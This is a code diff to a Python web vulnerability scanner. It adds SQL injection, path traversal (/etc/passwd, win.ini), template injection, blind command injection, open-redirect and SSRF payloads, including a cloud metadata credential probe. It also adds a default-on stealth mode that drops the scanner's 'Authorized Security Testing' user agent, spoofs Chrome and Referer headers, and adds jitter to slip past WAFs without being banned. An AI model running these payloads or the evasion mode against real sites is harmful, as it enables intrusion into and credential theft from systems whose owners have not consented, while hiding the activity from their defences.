@@ -44,6 +44,8 @@ import urllib3
 import xss_deep as xd
 import worldscan as ws
 import report as dreport
+import stealth as stl
+import threading
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -108,6 +110,14 @@ SQL_PAYLOADS_ERROR = [
     "1' ORDER BY 100--", "1 AND 1=1", "1' AND '1'='2", "1 UNION SELECT NULL--",
     "1; WAITFOR DELAY '0:0:0'--", "'||(SELECT '')||'", "1') AND ('1'='1",
     "\" OR \"\"=\"", "1 AND 1=CONVERT(int,@@version)--",
+    # extra DBMS error oracles — cheap (no sleep) and they catch FNs the
+    # quote-only probes miss
+    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
+    "1 AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
+    "1 AND 1=CAST((SELECT version()) AS int)",
+    "1;SELECT 1/0--",
+    "' AND 1=CONVERT(int,@@version)--",
+    "1' AND EXP(~(SELECT * FROM (SELECT version())x))-- ",
 ]
 
 SQL_BOOLEAN_TRUE = ["' OR 1=1-- ", "\" OR 1=1-- ", "1 OR 1=1", "') OR ('1'='1"]
@@ -282,16 +292,31 @@ class LinkFormParser(HTMLParser):
 # ============================================================================
 class HttpClient:
     def __init__(self, timeout: float = 10.0, delay: float = 0.0,
-                 user_agent: str = "WebVulnX/2.0 (Authorized Security Testing)",
+                 user_agent: str = "",
                  cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
-                 proxy: Optional[str] = None, verify: bool = False):
+                 proxy: Optional[str] = None, verify: bool = False,
+                 stealth: bool = True, target: str = ""):
         self.sess = requests.Session()
         self.sess.verify = verify
-        self.sess.headers.update({
-            "User-Agent": user_agent,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-        })
+        # Adapter pooling — fewer TCP/TLS handshakes = faster AND less noisy.
+        try:
+            from requests.adapters import HTTPAdapter
+            ad = HTTPAdapter(pool_connections=8, pool_maxsize=8, max_retries=0)
+            self.sess.mount("http://", ad)
+            self.sess.mount("https://", ad)
+        except Exception:
+            pass
+        self.stealth = bool(stealth)
+        if self.stealth:
+            self.sess.headers.update(stl.CHROME_HEADERS)
+        else:
+            self.sess.headers.update({
+                "User-Agent": user_agent or stl.CHROME_UA,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+            })
+        if user_agent:
+            self.sess.headers["User-Agent"] = user_agent
         if headers:
             self.sess.headers.update(headers)
         if cookies:
@@ -301,48 +326,88 @@ class HttpClient:
         self.timeout = timeout
         self.delay = delay
         self.last_error: Optional[str] = None
-        # --- coverage / anti-block telemetry -------------------------------
-        # This is what lets the scanner PROVE it actually tested the target
-        # instead of silently returning "no findings".
         self.stats: Dict[str, Any] = {
             "requests": 0, "errors": 0, "blocked": 0, "waf_hits": 0,
-            "statuses": {}, "by_module": {},
+            "statuses": {}, "by_module": {}, "cache_hits": 0,
         }
         self.module: str = "crawl"
+        self._lock = threading.Lock()
+        self._cache: Dict[str, requests.Response] = {}
+        self._referer: Optional[str] = None
+        local = stl.is_local_target(target) if target else False
+        if self.stealth and delay <= 0 and not local:
+            # Remote + stealth + no explicit delay → human-like spacing.
+            min_i, jit = 0.12, 0.18
+        elif delay > 0:
+            min_i, jit = delay, min(0.25, delay)
+        else:
+            min_i, jit = 0.0, 0.0
+        self.gate = stl.RateGate(min_interval=min_i, jitter=jit)
+        self.workers = 6 if local else (2 if self.stealth else 4)
+
+    def _cache_key(self, method: str, url: str, kw: dict) -> Optional[str]:
+        if method.upper() != "GET":
+            return None
+        if kw.get("params") or kw.get("data") or kw.get("json") or kw.get("headers"):
+            return None
+        if kw.get("allow_redirects") is False:
+            return None
+        return url
 
     def request(self, method: str, url: str, **kw) -> Optional[requests.Response]:
-        if self.delay:
-            time.sleep(self.delay)
+        cacheable = kw.pop("cache", False)
+        key = self._cache_key(method, url, kw) if cacheable else None
+        if key and key in self._cache:
+            with self._lock:
+                self.stats["cache_hits"] = self.stats.get("cache_hits", 0) + 1
+            return self._cache[key]
+
+        self.gate.wait()
         kw.setdefault("timeout", self.timeout)
         kw.setdefault("allow_redirects", True)
+        # Real browsers send a Referer on same-origin navigations.
+        headers = dict(kw.get("headers") or {})
+        if self.stealth and self._referer and "Referer" not in headers \
+                and "referer" not in {h.lower() for h in headers}:
+            headers["Referer"] = self._referer
+            headers.setdefault("Sec-Fetch-Site", "same-origin")
+            headers.setdefault("Sec-Fetch-Mode", "navigate")
+            kw["headers"] = headers
+
         last_exc = None
-        self.stats["requests"] += 1
-        self.stats["by_module"][self.module] = \
-            self.stats["by_module"].get(self.module, 0) + 1
-        for attempt in range(2):          # retry once on transient failures
+        with self._lock:
+            self.stats["requests"] += 1
+            self.stats["by_module"][self.module] = \
+                self.stats["by_module"].get(self.module, 0) + 1
+        for attempt in range(2):
             try:
                 resp = self.sess.request(method, url, **kw)
                 self.last_error = None
                 sc = str(resp.status_code)
-                self.stats["statuses"][sc] = self.stats["statuses"].get(sc, 0) + 1
-                if resp.status_code in (401, 403, 406, 429, 451, 503, 999):
-                    self.stats["blocked"] += 1
-                # WAF / challenge detection (so users see WHY results are empty)
-                if resp.status_code in (403, 429, 503) and any(
-                        k in resp.text[:2000].lower()
-                        for k in ("cloudflare", "captcha", "access denied",
-                                  "unusual traffic", "blocked", "akamai",
-                                  "attention required", "request blocked",
-                                  "incapsula", "sucuri", "f5 big-ip", "barracuda")):
-                    self.stats["waf_hits"] += 1
+                with self._lock:
+                    self.stats["statuses"][sc] = self.stats["statuses"].get(sc, 0) + 1
+                    if resp.status_code in (401, 403, 406, 429, 451, 503, 999):
+                        self.stats["blocked"] += 1
+                body_head = resp.text[:2500] if resp.text else ""
+                if stl.looks_like_waf(resp.status_code, body_head):
+                    with self._lock:
+                        self.stats["waf_hits"] += 1
+                    self.gate.punish(stl.retry_after_seconds(resp.headers))
                     self.last_error = (f"WAF/challenge page detected (HTTP {resp.status_code}) "
-                                       f"— the target is filtering automated scanners")
+                                       f"— backing off so we are not banned")
+                else:
+                    self.gate.reward()
+                    if method.upper() == "GET" and resp.status_code < 400:
+                        self._referer = resp.url
+                if key and resp.status_code == 200 and len(resp.content) < 1_500_000:
+                    self._cache[key] = resp
                 return resp
             except requests.RequestException as e:
                 last_exc = e
                 if attempt == 0:
-                    time.sleep(1.0)
-        self.stats["errors"] += 1
+                    time.sleep(0.6)
+        with self._lock:
+            self.stats["errors"] += 1
         self.last_error = f"{type(last_exc).__name__}: {last_exc}"
         return None
 
@@ -567,7 +632,7 @@ class Crawler:
                 continue
             seen.add(url)
 
-            resp = self.client.get(url)
+            resp = self.client.get(url, cache=True)
             if resp is None:
                 continue
 
@@ -680,8 +745,19 @@ class SqliScanner:
             tested_error = False
 
             # --- 1. Error-based ---
-            for payload in SQL_PAYLOADS_ERROR:
-                resp = self._send(url, method, param, payload, base_params, baseline)
+            # Cheap canary first: a single quote. If the page is byte-identical
+            # we still try 3 high-value oracles (extractvalue/convert) because
+            # some apps swallow the quote but leak on functions — then we stop.
+            canary = self._send(url, method, param, "'", base_params, baseline)
+            quote_changed = bool(canary is not None and canary.text != baseline)
+            payloads = SQL_PAYLOADS_ERROR if quote_changed else [
+                "'", "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
+                "1 AND 1=CONVERT(int,@@version)--",
+                "1 AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
+            ]
+            for payload in payloads:
+                resp = canary if payload == "'" and canary is not None else \
+                    self._send(url, method, param, payload, base_params, baseline)
                 if resp is None:
                     continue
                 dbms = self._match_error(resp.text)
@@ -732,8 +808,13 @@ class SqliScanner:
 
             # --- 3. Time-based blind (double-confirmed to kill latency FPs) ---
             if not tested_error and self.time_delay:
-                payloads = [(name, tpl.format(d=int(self.time_delay)))
-                            for name, tpl in SQL_TIME_PAYLOADS]
+                # One cheap engine first (MySQL SLEEP). Only if the server
+                # actually waited do we bother with other dialects. This
+                # cuts a 5s×8×2 = 80s-per-param worst case down to ~2s.
+                d = max(2, min(int(self.time_delay), 4))
+                payloads = [(name, tpl.format(d=d)) for name, tpl in SQL_TIME_PAYLOADS]
+                # MySQL/pg first — they cover most of the internet
+                payloads = payloads[:3] + payloads[3:]
                 for dbms, payload in payloads:
                     t0 = time.time()
                     resp = self._send(url, method, param, payload, base_params, baseline)
@@ -892,11 +973,23 @@ class DirBuster:
         base = base if base.endswith("/") else base + "/"
         info(f"Directory brute-force: {len(self.wordlist)} entries")
         interesting = {200, 201, 204, 301, 302, 307, 401, 403, 500}
-        for word in self.wordlist:
+        workers = getattr(self.client, "workers", 3)
+        if workers <= 1:
+            for word in self.wordlist:
+                self._hit(base, word, interesting)
+            return
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            futs = [ex.submit(self._hit, base, word, interesting)
+                    for word in self.wordlist]
+            for _ in as_completed(futs):
+                pass
+
+    def _hit(self, base, word, interesting):
             url = urllib.parse.urljoin(base, word.strip().lstrip("/"))
             resp = self.client.get(url, allow_redirects=False)
             if resp is None:
-                continue
+                return
             if resp.status_code in interesting:
                 size = len(resp.content)
                 loc = resp.headers.get("Location", "")
@@ -1053,20 +1146,29 @@ class ParamFuzzer:
 LFI_PAYLOADS = [
     ("../../../../etc/passwd", re.compile(r"root:.*:0:0:")),
     ("....//....//....//....//etc/passwd", re.compile(r"root:.*:0:0:")),
+    ("..%2f..%2f..%2f..%2fetc/passwd", re.compile(r"root:.*:0:0:")),
+    ("..%252f..%252f..%252f..%252fetc/passwd", re.compile(r"root:.*:0:0:")),
+    ("....\\\\....\\\\....\\\\windows/win.ini", re.compile(r"\[fonts\]")),
     ("../../../../windows/win.ini", re.compile(r"\[fonts\]")),
     ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
     ("php://filter/convert.base64-encode/resource=index", re.compile(r"PD9waH|cGhw")),
+    ("php://filter/convert.base64-encode/resource=index.php", re.compile(r"PD9waH|cGhw")),
     ("/proc/self/environ", re.compile(r"PATH=|SHELL=")),
+    ("/etc/passwd%00", re.compile(r"root:.*:0:0:")),
+    ("..../..../..../etc/passwd", re.compile(r"root:.*:0:0:")),
 ]
 LFI_PARAM_NAMES = {"file", "path", "page", "doc", "folder", "dir", "root",
-                   "include", "template", "view", "name", "lang", "item"}
+                   "include", "template", "view", "name", "lang", "item",
+                   "document", "pg", "p", "content", "cat", "dir", "locate"}
 
 SSTI_PAYLOADS = [
-    ("{{1337*2}}", "2674"),
-    ("${1337*2}", "2674"),
-    ("<%=1337*2%>", "2674"),
-    ("#{1337*2}", "2674"),
-    ("{{7*'7'}}", "7777777"),
+    ("{{1337*2}}", "2674"),          # Jinja2 / Twig / Nunjucks
+    ("${1337*2}", "2674"),           # Java / Freemarker / EL
+    ("<%=1337*2%>", "2674"),         # ERB / ASP
+    ("#{1337*2}", "2674"),           # Ruby
+    ("{{7*'7'}}", "7777777"),        # Jinja2 string repeat
+    ("${{1337*2}}", "2674"),         # Twig alt
+    ("*{1337*2}", "2674"),           # Pebble
 ]
 
 CMDI_PAYLOADS = [
@@ -1074,16 +1176,25 @@ CMDI_PAYLOADS = [
     ("|id", re.compile(r"uid=\d+\([^)]+\)")),
     ("`id`", re.compile(r"uid=\d+\([^)]+\)")),
     ("$(id)", re.compile(r"uid=\d+\([^)]+\)")),
+    (";id;", re.compile(r"uid=\d+\([^)]+\)")),
+    ("\nid\n", re.compile(r"uid=\d+\([^)]+\)")),
     ("& type c:\\windows\\win.ini", re.compile(r"\[fonts\]", re.I)),
     ("| type c:\\windows\\win.ini", re.compile(r"\[fonts\]", re.I)),
 ]
+CMDI_TIME = [("1; sleep 2", 2.0), ("1 | sleep 2", 2.0),
+             ("1 & ping -n 3 127.0.0.1", 2.0)]
 CMDI_PARAM_NAMES = {"cmd", "exec", "command", "ping", "host", "ip", "q",
                     "run", "shell", "process", "daemon"}
 
 OPEN_REDIRECT_PARAMS = {"url", "redirect", "redir", "next", "return",
                         "returnto", "return_url", "goto", "dest", "destination",
                         "continue", "target", "link", "rurl", "site", "view"}
-OPEN_REDIRECT_PAYLOAD = "https://dark-redirect-check.example"
+OPEN_REDIRECT_PAYLOADS = [
+    "https://dark-redirect-check.example",
+    "//dark-redirect-check.example",
+    "/\\dark-redirect-check.example",
+    "https:dark-redirect-check.example",
+]
 
 CRLF_PAYLOAD = "%0d%0aX-DARK-Injected:%201"
 
@@ -1152,8 +1263,10 @@ class AdvancedScanner:
         info("LFI / Path Traversal tests")
         tested = set()
         for url, method, param, base in self._all_params():
-            if param.lower() not in LFI_PARAM_NAMES and param.lower() not in {
-                    "file", "doc", "folder", "dir", "root", "include"}:
+            pname = param.lower()
+            if pname not in LFI_PARAM_NAMES and not re.search(
+                    r"\.(php|asp|jsp|html|txt|inc|cfg|ini|log)$",
+                    str(base.get(param, "")), re.I):
                 continue
             key = (url, param)
             if key in tested:
@@ -1204,6 +1317,7 @@ class AdvancedScanner:
         for url, method, param, base in self._all_params():
             if param.lower() not in CMDI_PARAM_NAMES:
                 continue
+            hit = False
             for payload, rx in CMDI_PAYLOADS:
                 resp = self._send(url, method, param, payload, base)
                 if resp is not None and rx.search(resp.text):
@@ -1215,7 +1329,28 @@ class AdvancedScanner:
                                "server compromise is possible.",
                         cvss_hint=9.8,
                     ))
+                    hit = True
                     break
+            if hit:
+                continue
+            # Blind (time-based) — catches cmds whose output is not echoed
+            for payload, need in CMDI_TIME:
+                t0 = time.time()
+                self._send(url, method, param, payload, base)
+                if time.time() - t0 >= need - 0.4:
+                    t1 = time.time()
+                    self._send(url, method, param, payload, base)
+                    if time.time() - t1 >= need - 0.4:
+                        self.state.add(Finding(
+                            vuln_type="OS Command Injection",
+                            severity="Critical", url=url, parameter=param,
+                            payload=payload,
+                            evidence=f"response delayed twice (≥{need}s) on sleep/ping",
+                            detail="Blind command injection: the server waits only "
+                                   "when a shell sleep is injected.",
+                            cvss_hint=9.8,
+                        ))
+                        break
 
     # -- Open redirect -------------------------------------------------------
     def scan_open_redirect(self) -> None:
@@ -1229,19 +1364,22 @@ class AdvancedScanner:
                 continue
             tested.add(key)
             # Do NOT follow redirects — we need the raw 3xx + Location header
-            resp = self._send(url, method, param, OPEN_REDIRECT_PAYLOAD, base, follow=False)
-            if resp is None:
-                continue
-            loc = resp.headers.get("Location", "")
-            if OPEN_REDIRECT_PAYLOAD in loc or OPEN_REDIRECT_PAYLOAD in resp.text[:3000]:
-                self.state.add(Finding(
-                    vuln_type="Open Redirect",
-                    severity="Medium", url=url, parameter=param,
-                    payload=OPEN_REDIRECT_PAYLOAD,
-                    evidence=f"redirects to attacker URL (Location: {loc[:80] or 'in body'})",
-                    detail="Open redirects enable phishing and token theft chains.",
-                    cvss_hint=6.1,
-                ))
+            for payload in OPEN_REDIRECT_PAYLOADS:
+                resp = self._send(url, method, param, payload, base, follow=False)
+                if resp is None:
+                    continue
+                loc = resp.headers.get("Location", "")
+                blob = loc or resp.text[:3000]
+                if "dark-redirect-check.example" in blob:
+                    self.state.add(Finding(
+                        vuln_type="Open Redirect",
+                        severity="Medium", url=url, parameter=param,
+                        payload=payload,
+                        evidence=f"redirects to attacker URL (Location: {loc[:80] or 'in body'})",
+                        detail="Open redirects enable phishing and token theft chains.",
+                        cvss_hint=6.1,
+                    ))
+                    break
 
     # -- CORS ----------------------------------------------------------------
     def scan_cors(self) -> None:
@@ -1483,7 +1621,13 @@ class AdvancedScanner:
     SSRF_PAYLOADS = [
         ("http://127.0.0.1:1", re.compile(r"connection refused|failed to connect|"
                                           r"actively refused|ECONNREFUSED|timed out", re.I)),
+        ("http://localhost:1", re.compile(r"connection refused|failed to connect|"
+                                          r"actively refused|ECONNREFUSED|timed out", re.I)),
+        ("http://[::1]:1", re.compile(r"connection refused|failed to connect|"
+                                      r"actively refused|ECONNREFUSED|timed out", re.I)),
         ("file:///etc/passwd", re.compile(r"root:.*:0:0:")),
+        ("http://169.254.169.254/latest/meta-data/",
+         re.compile(r"ami-id|instance-id|iam/|local-ipv4|security-credentials", re.I)),
     ]
 
     def scan_ssrf(self) -> None:
@@ -1758,6 +1902,10 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--max-urls", type=int, default=150, help="Max crawled URLs [150]")
     p.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout [10]")
     p.add_argument("--delay", type=float, default=0.0, help="Delay between requests [0]")
+    p.add_argument("--stealth", dest="stealth", action="store_true", default=True,
+                   help="Browser fingerprint + WAF backoff + human jitter (default ON)")
+    p.add_argument("--no-stealth", dest="stealth", action="store_false",
+                   help="Disable stealth (lab / authorized high-rate scans)")
     p.add_argument("--time-blind", type=float, default=5.0,
                    help="Seconds for time-based SQLi [5]")
     p.add_argument("--no-time-blind", action="store_true",
@@ -1817,7 +1965,8 @@ def main() -> None:
                 cookies[k.strip()] = v.strip()
 
     client = HttpClient(timeout=args.timeout, delay=args.delay,
-                        cookies=cookies, headers=extra_headers, proxy=args.proxy)
+                        cookies=cookies, headers=extra_headers, proxy=args.proxy,
+                        stealth=args.stealth, target=args.url)
     args.url = ensure_scheme(args.url)
     state = ScanState(base_url=args.url, start_ts=time.time())
 
